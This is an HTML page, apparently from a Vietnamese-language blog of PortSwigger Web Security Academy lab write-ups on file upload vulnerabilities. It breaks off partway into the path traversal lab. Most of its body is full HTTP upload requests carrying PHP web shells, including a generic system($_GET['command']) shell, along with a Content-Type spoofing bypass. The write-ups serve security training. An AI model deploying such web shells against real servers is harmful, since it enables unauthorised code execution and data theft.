@@ -1,0 +1,1797 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My PortSwigger Web Security Academy writeups">
+      
+      
+        <meta name="author" content="Thanh Dat Hoang">
+      
+      
+        <link rel="canonical" href="https://hoangdat2407.github.io/myblog/Portswigger/File%20upload%20vulnerabilities/">
+      
+      
+        <link rel="prev" href="../Business%20logic%20vulnerabilities/">
+      
+      
+        <link rel="next" href="../GraphQL/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>File Upload - PortSwigger Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#file-upload-vulnerabilities" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="PortSwigger Writeups" class="md-header__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PortSwigger Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              File Upload
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="PortSwigger Writeups" class="md-nav__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    PortSwigger Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Server-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Access%20control%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Authentication%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Business%20logic%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GraphQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Information%20disclosure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Disclosure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20deserialize/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insecure Deserialization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JWT%20attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JWT Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NoSQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Oauth/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OAuth
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OS%20command%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Path%20traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prototype%20polution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prototype Pollution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Race%20condition/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Race Condition
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20side%20template%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20cache%20poisoning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Cache Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20socket/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WebSocket
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XML%20external%20entity%20%28XXE%29%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Client-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Clickjacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clickjacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CORS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DOM-based%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DOM-based Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="file-upload-vulnerabilities">File upload vulnerabilities<a class="headerlink" href="#file-upload-vulnerabilities" title="Permanent link">&para;</a></h1>
+<h1 id="lab-remote-code-execution-via-web-shell-upload"><strong>Lab: Remote code execution via web shell upload</strong><a class="headerlink" href="#lab-remote-code-execution-via-web-shell-upload" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload">Lab: Remote code execution via web shell upload | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện login vào tài khoản <code>wiener:peter</code> . Thực hiện điều hướng đến chức năng <code>My account</code> . Tại đây, upload avatar</p>
+<p><img alt="image.png" src="image.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /my-account/avatar</code> . Thực hiện chỉnh sửa body request theo body của request sau:</p>
+<div class="highlight"><pre><span></span><code><span class="x">POST /my-account/avatar HTTP/2</span>
+<span class="x">Host: 0a7b0066045fb841846a1d1900ff0070.web-security-academy.net</span>
+<span class="x">Cookie: session=GjTh4P9vOjw1rysz1b7rKvtOdjnbOdkn</span>
+<span class="x">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0</span>
+<span class="x">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="x">Accept-Language: en-US,en;q=0.9</span>
+<span class="x">Accept-Encoding: gzip, deflate, br</span>
+<span class="x">Content-Type: multipart/form-data; boundary=----geckoformboundarycb71a082a77122f382c635cbd286e56</span>
+<span class="x">Content-Length: 502</span>
+<span class="x">Origin: https://0a7b0066045fb841846a1d1900ff0070.web-security-academy.net</span>
+<span class="x">Referer: https://0a7b0066045fb841846a1d1900ff0070.web-security-academy.net/my-account?id=wiener</span>
+<span class="x">Upgrade-Insecure-Requests: 1</span>
+<span class="x">Sec-Fetch-Dest: document</span>
+<span class="x">Sec-Fetch-Mode: navigate</span>
+<span class="x">Sec-Fetch-Site: same-origin</span>
+<span class="x">Sec-Fetch-User: ?1</span>
+<span class="x">Priority: u=0, i</span>
+<span class="x">Te: trailers</span>
+
+<span class="x">------geckoformboundarycb71a082a77122f382c635cbd286e56</span>
+<span class="x">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;avatar-anh-meo-cute-1.php&quot;</span>
+<span class="x">Content-Type: application/x-php</span>
+
+<span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span>
+<span class="x">------geckoformboundarycb71a082a77122f382c635cbd286e56</span>
+<span class="x">Content-Disposition: form-data; name=&quot;user&quot;</span>
+
+<span class="x">wiener</span>
+<span class="x">------geckoformboundarycb71a082a77122f382c635cbd286e56</span>
+<span class="x">Content-Disposition: form-data; name=&quot;csrf&quot;</span>
+
+<span class="x">t8U7lPhe3jAC9ha1yBflU5kGDsssDEQs</span>
+<span class="x">------geckoformboundarycb71a082a77122f382c635cbd286e56--</span>
+</code></pre></div>
+</li>
+<li>
+<p>Thực hiện truy cập đường dẫn file đã upload. Quan sát thấy file thực thi thành công</p>
+<p><img alt="image.png" src="image%201.png" /></p>
+</li>
+<li>
+<p>Thực hiện đọc file bằng cách gửi request sau:</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="x">POST /my-account/avatar HTTP/2</span>
+<span class="x">Host: 0a7b0066045fb841846a1d1900ff0070.web-security-academy.net</span>
+<span class="x">Cookie: session=GjTh4P9vOjw1rysz1b7rKvtOdjnbOdkn</span>
+<span class="x">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0</span>
+<span class="x">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="x">Accept-Language: en-US,en;q=0.9</span>
+<span class="x">Accept-Encoding: gzip, deflate, br</span>
+<span class="x">Content-Type: multipart/form-data; boundary=----geckoformboundarycb71a082a77122f382c635cbd286e56</span>
+<span class="x">Content-Length: 526</span>
+<span class="x">Origin: https://0a7b0066045fb841846a1d1900ff0070.web-security-academy.net</span>
+<span class="x">Referer: https://0a7b0066045fb841846a1d1900ff0070.web-security-academy.net/my-account?id=wiener</span>
+<span class="x">Upgrade-Insecure-Requests: 1</span>
+<span class="x">Sec-Fetch-Dest: document</span>
+<span class="x">Sec-Fetch-Mode: navigate</span>
+<span class="x">Sec-Fetch-Site: same-origin</span>
+<span class="x">Sec-Fetch-User: ?1</span>
+<span class="x">Priority: u=0, i</span>
+<span class="x">Te: trailers</span>
+
+<span class="x">------geckoformboundarycb71a082a77122f382c635cbd286e56</span>
+<span class="x">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;avatar-anh-meo-cute-1.php&quot;</span>
+<span class="x">Content-Type: application/x-php</span>
+
+<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;cat /home/carlos/secret&quot;</span><span class="p">);</span><span class="cp">?&gt;</span>
+<span class="x">------geckoformboundarycb71a082a77122f382c635cbd286e56</span>
+<span class="x">Content-Disposition: form-data; name=&quot;user&quot;</span>
+
+<span class="x">wiener</span>
+<span class="x">------geckoformboundarycb71a082a77122f382c635cbd286e56</span>
+<span class="x">Content-Disposition: form-data; name=&quot;csrf&quot;</span>
+
+<span class="x">t8U7lPhe3jAC9ha1yBflU5kGDsssDEQs</span>
+<span class="x">------geckoformboundarycb71a082a77122f382c635cbd286e56--</span>
+</code></pre></div>
+</li>
+<li>
+<p>Thực thi code và đọc được secret. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%202.png" /></p>
+<p><img alt="image.png" src="image%203.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-web-shell-upload-via-content-type-restriction-bypass"><strong>Lab: Web shell upload via Content-Type restriction bypass</strong><a class="headerlink" href="#lab-web-shell-upload-via-content-type-restriction-bypass" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass">Lab: Web shell upload via Content-Type restriction bypass | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện login vào tài khoản <code>wiener:peter</code> . Điều hướng đến chức năng <code>My account &gt; Avatar &gt; Upload Avatar</code> .</p>
+<p><img alt="image.png" src="image%204.png" /></p>
+</li>
+<li>
+<p>Thực hiện upload file <code>php</code> thì bị server chặn → server kiểm tra dựa trên <code>application/x-php</code> → attacker kiểm soát được.</p>
+<p><img alt="image.png" src="image%205.png" /></p>
+</li>
+<li>
+<p>Để <code>Content-Type</code> là dang hợp lệ <code>image/jpeg</code> và thực hiện upload được file <code>php</code> thành công</p>
+<div class="highlight"><pre><span></span><code><span class="x">POST /my-account/avatar HTTP/2</span>
+<span class="x">Host: 0aa8003704e7a76c80a2772500510004.web-security-academy.net</span>
+<span class="x">Cookie: session=D8ovaY5ZOtht4GfjkHvH8oHF6xLflqzo</span>
+<span class="x">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0</span>
+<span class="x">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="x">Accept-Language: en-US,en;q=0.9</span>
+<span class="x">Accept-Encoding: gzip, deflate, br</span>
+<span class="x">Content-Type: multipart/form-data; boundary=----geckoformboundarydc2377ec97703fe7d732ff83bedae4e3</span>
+<span class="x">Content-Length: 523</span>
+<span class="x">Origin: https://0aa8003704e7a76c80a2772500510004.web-security-academy.net</span>
+<span class="x">Referer: https://0aa8003704e7a76c80a2772500510004.web-security-academy.net/my-account?id=wiener</span>
+<span class="x">Upgrade-Insecure-Requests: 1</span>
+<span class="x">Sec-Fetch-Dest: document</span>
+<span class="x">Sec-Fetch-Mode: navigate</span>
+<span class="x">Sec-Fetch-Site: same-origin</span>
+<span class="x">Sec-Fetch-User: ?1</span>
+<span class="x">Priority: u=0, i</span>
+<span class="x">Te: trailers</span>
+
+<span class="x">------geckoformboundarydc2377ec97703fe7d732ff83bedae4e3</span>
+<span class="x">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;avatar-anh-meo-cute-1.php&quot;</span>
+<span class="x">Content-Type: image/jpeg</span>
+
+<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;cat /home/carlos/secret&quot;</span><span class="p">);</span><span class="cp">?&gt;</span>
+<span class="x">------geckoformboundarydc2377ec97703fe7d732ff83bedae4e3</span>
+<span class="x">Content-Disposition: form-data; name=&quot;user&quot;</span>
+
+<span class="x">wiener</span>
+<span class="x">------geckoformboundarydc2377ec97703fe7d732ff83bedae4e3</span>
+<span class="x">Content-Disposition: form-data; name=&quot;csrf&quot;</span>
+
+<span class="x">xTQUmgkVtGP9a4aai9IUSntLj0xb5GkR</span>
+<span class="x">------geckoformboundarydc2377ec97703fe7d732ff83bedae4e3--</span>
+</code></pre></div>
+<p><img alt="image.png" src="image%206.png" /></p>
+</li>
+<li>
+<p>Thực hiện truy cập file đã upload → code được thực thi → submit secret hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%207.png" /></p>
+<p><img alt="image.png" src="image%208.png" /></p>
+</li>
+</ul>
+<h1 id="lab-web-shell-upload-via-path-traversal"><strong>Lab: Web shell upload via path traversal</strong><a class="headerlink" href="#lab-web-shell-upload-via-path-traversal" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal">Lab: Web shell upload via path traversal | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết, login với tài khoản <code>wiener:peter</code> . Điều hướng đến chức năng <code>My account &gt; Avatar &gt; Upload</code> . Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /my-account/avatar</code> và chuyển sang tab Repeater. Tại đây, thực hiện upload file php bằng request sau:</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="x">POST /my-account/avatar HTTP/2</span>
+<span class="x">Host: 0a9000320447c7f8818789a100cd005c.web-security-academy.net</span>
+<span class="x">Cookie: session=XsdPw8VeEafilI8v7A1LPtLmPTHq686F</span>
+<span class="x">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0</span>
+<span class="x">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="x">Accept-Language: en-US,en;q=0.9</span>
+<span class="x">Accept-Encoding: gzip, deflate, br</span>
+<span class="x">Content-Type: multipart/form-data; boundary=----geckoformboundaryd218eeb73cc709158f9edb40eafa251e</span>
+<span class="x">Content-Length: 523</span>
+<span class="x">Origin: https://0a9000320447c7f8818789a100cd005c.web-security-academy.net</span>
+<span class="x">Referer: https://0a9000320447c7f8818789a100cd005c.web-security-academy.net/my-account</span>
+<span class="x">Upgrade-Insecure-Requests: 1</span>
+<span class="x">Sec-Fetch-Dest: document</span>
+<span class="x">Sec-Fetch-Mode: navigate</span>
+<span class="x">Sec-Fetch-Site: same-origin</span>
+<span class="x">Sec-Fetch-User: ?1</span>
+<span class="x">Priority: u=0, i</span>
+<span class="x">Te: trailers</span>
+
+<span class="x">------geckoformboundaryd218eeb73cc709158f9edb40eafa251e</span>
+<span class="x">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;1772433842_a.php&quot;</span>
+<span class="x">Content-Type: application/x-php</span>
+
+<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+<span class="x">------geckoformboundaryd218eeb73cc709158f9edb40eafa251e</span>
+<span class="x">Content-Disposition: form-data; name=&quot;user&quot;</span>
+
+<span class="x">wiener</span>
+<span class="x">------geckoformboundaryd218eeb73cc709158f9edb40eafa251e</span>
+<span class="x">Content-Disposition: form-data; name=&quot;csrf&quot;</span>
+
+<span class="x">q7TvlQuePGWpCcyGYLHGhikGvmJa9S7B</span>
+<span class="x">------geckoformboundaryd218eeb73cc709158f9edb40eafa251e--</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
